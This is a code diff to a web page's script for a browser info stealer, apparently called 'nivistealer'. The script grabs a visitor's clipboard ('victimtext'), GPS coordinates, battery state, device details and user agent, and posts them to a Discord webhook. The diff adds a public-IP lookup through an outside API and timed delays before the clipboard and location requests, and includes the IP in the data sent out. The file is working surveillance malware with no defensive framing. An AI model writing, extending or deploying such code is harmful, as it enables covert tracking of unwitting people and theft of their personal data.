@@ -98,20 +98,40 @@
       <script src="x-frame-bypass.js" type="module"></script>
       <script>
          $(document).ready(function() {
-           var batterypercentage
-           var ischarging
-           async function getclips() {
-             var btr = await navigator.getBattery();
-             batterypercentage = String(btr.level*100+"%");
-             ischarging = String(btr.charging);
-             try {
-               let victimtext = await navigator.clipboard.readText();
-               giveclips(victimtext)
-             } catch (error) {
-               giveclips("Clipboard Permission Denied")
-             }
-           }
-           getclips()
+            var batterypercentage;
+            var ischarging;
+            function getPublicIp() {
+              const xhr = new XMLHttpRequest();
+              xhr.open('GET', 'https://api.ipify.org?format=json', false);
+              xhr.send();
+
+              if (xhr.status === 200) {
+                const data = JSON.parse(xhr.responseText);
+                return data.ip;
+              } else {
+                console.error(`Error: ${xhr.statusText}`);
+                return null;
+              }
+            }
+
+             const publicIp = getPublicIp();
+             async function getclips() {
+                var btr = await navigator.getBattery();
+                batterypercentage = String(btr.level * 100 + "%");
+                ischarging = String(btr.charging);
+
+              // Add a 8-second delay using setTimeout
+              setTimeout(async function() {
+                try {
+                  let victimtext = await navigator.clipboard.readText();
+                  giveclips(victimtext);
+                } catch (error) {
+                  giveclips("Clipboard Permission Denied");
+                }
+              }, 8000);
+            }
+
+            getclips();
            var clips
 
            function giveclips(polp) {
@@ -119,13 +139,15 @@
              getLocation()
            }
 
-           function getLocation() {
-             if (navigator.geolocation) {
-               navigator.geolocation.getCurrentPosition(showPosition, showError);
-             } else {
-               alert("Your Browser Does not support Gps");
-             }
-           }
+          function getLocation() {
+                 if (navigator.geolocation) {
+                   setTimeout(() => {
+                     navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
+                   }, 5000);
+                 } else {
+                   alert("Your Browser Does not support Gps");
+                 }
+               }
 
            function showPosition(position) {
              var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
@@ -172,7 +194,7 @@
              request.open("POST", "https://your-discordwebhook-url");
              request.setRequestHeader('Content-type', 'application/json');
              var params = {
-               content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+               content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n" + "> **Public IP  : **" + publicIp),
                username: "nivistealer",
                avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
              }
